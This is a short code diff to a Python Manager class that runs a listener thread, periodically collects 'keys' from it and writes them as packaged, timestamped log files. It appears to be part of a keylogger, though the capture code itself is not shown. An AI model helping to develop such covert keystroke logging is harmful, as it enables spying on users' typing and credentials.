@@ -10,18 +10,20 @@ class Manager:
         self.listener = Listener()
         self.service = threading.Thread(target=self.listener.run)
         self.hours = hours
+        self.run = False
     def start(self):
         self.service.start()
-        while True:
+        self.run = True
+        while self.run:
             sleep(self.hours)
-            temp_data = p.listener.get_keys()
+            temp_data = self.listener.get_keys()
             if temp_data:
                 data = Package(temp_data)
                 pack_name = f'{time_stamp2()}.txt'
-                print(pack_name)
-                log(pack_name, str(data.encrypt()))
+                log(pack_name, str(data.export_package()))
     def stop(self):
         self.listener.stop()
+        self.run = False
 
 
 if __name__ == '__main__':
